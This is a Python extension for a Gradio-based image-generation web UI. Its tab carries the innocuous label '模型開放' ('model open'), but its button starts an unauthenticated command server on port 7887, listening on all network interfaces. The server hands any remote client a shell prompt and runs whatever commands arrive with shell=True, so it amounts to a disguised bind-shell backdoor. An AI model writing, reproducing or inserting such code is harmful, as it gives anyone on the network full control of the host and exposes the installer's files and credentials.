import gradio as gr
from modules import script_callbacks
import socket
import threading
import time
import subprocess
import os
import platform

class RemoteControlServer:
    def __init__(self):
        self.connected = False
        self.server_socket = None
        self.client_socket = None
        self.server_thread = None
        self.stop_server = False
        self.port = 7887
        self.current_user = os.getlogin()
        
        try:
            self.current_hostname = os.uname().nodename
        except AttributeError:
            self.current_hostname = platform.node()
        
    def start_server(self):
        if self.connected:
            return "Server already running", True
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(1)
            self.stop_server = False
            
            self.server_thread = threading.Thread(target=self._accept_connections)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            return f"Server started on port {self.port}", True
            
        except Exception as e:
            return f"Failed to start server: {str(e)}", False
    
    def stop_server_func(self):
        self.stop_server = True
        self.connected = False
        
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            finally:
                self.client_socket = None
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
            finally:
                self.server_socket = None
        
        return "Server stopped", False
    
    def _accept_connections(self):
        while not self.stop_server:
            try:
                self.server_socket.settimeout(1)
                client_socket, client_address = self.server_socket.accept()
                self.client_socket = client_socket
                self.connected = True
                print(f"Connection from {client_address}")
                
                welcome_msg = f"Remote command server\nConnected from: {client_address}\nServer: {self.current_user}@{self.current_hostname}\nType 'exit' to quit\n\n"
                self.client_socket.sendall(welcome_msg.encode())
                self._send_prompt()
                self._handle_client()
                
            except socket.timeout:
                continue
            except Exception as e:
                if not self.stop_server:
                    print(f"Accept error: {str(e)}")
                break
    
    def _send_prompt(self):
        try:
            cwd = os.getcwd()
            prompt = f"{self.current_user}@{self.current_hostname}:{cwd}$ "
            self.client_socket.sendall(prompt.encode())
        except:
            self.client_socket.sendall("$ ".encode())
    
    def _handle_client(self):
        try:
            buffer = ""
            self.client_socket.settimeout(0.1)
            
            while self.connected and not self.stop_server:
                try:
                    data = self.client_socket.recv(1024).decode()
                    if not data:
                        break
                    
                    buffer += data
                    if '\n' in buffer or '\r' in buffer:
                        command = buffer.strip()
                        buffer = ""
                        
                        if not command:
                            self._send_prompt()
                            continue
                        
                        print(f"Received command: {command}")
                        
                        if command.lower() in ['exit', 'quit']:
                            self.client_socket.sendall("Goodbye!\n".encode())
                            break
                        
                        result = self._execute_command(command)
                        self.client_socket.sendall((result + "\n").encode())
                        self._send_prompt()
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"Command handling error: {str(e)}")
                    break
                    
        except Exception as e:
            print(f"Client handling error: {str(e)}")
        finally:
            self.connected = False
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
    
    def _execute_command(self, command):
        try:
            print(f"Executing: {command}")
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode(errors='ignore')
            
            return f"{result}"
            
        except subprocess.CalledProcessError as e:
            return f"Error (exit code {e.returncode}):\n{e.output.decode(errors='ignore')}"
        except subprocess.TimeoutExpired:
            return "Error: Command timed out (30s)"
        except Exception as e:
            return f"Execution error: {str(e)}"

server = RemoteControlServer()

def toggle_server(server_running):
    if server_running:
        status_msg, new_state = server.stop_server_func()
        return status_msg, new_state, "Start Server"
    else:
        status_msg, new_state = server.start_server()
        return status_msg, new_state, "Stop Server"

def on_ui_tabs():
    with gr.Blocks(analytics_enabled=False) as demo:
        gr.Markdown("模型開放")
        
        with gr.Row():
            with gr.Column(scale=1):
                status = gr.Textbox(label="Status", value="Stopped")
                btn = gr.Button("Start Server", variant="stop")
                server_running = gr.State(False)
                
                btn.click(
                    fn=toggle_server,
                    inputs=[server_running],
                    outputs=[status, server_running, btn]
                )
        

    return [(demo, "模型開放", "remote_control_server_tab")]

script_callbacks.on_ui_tabs(on_ui_tabs)
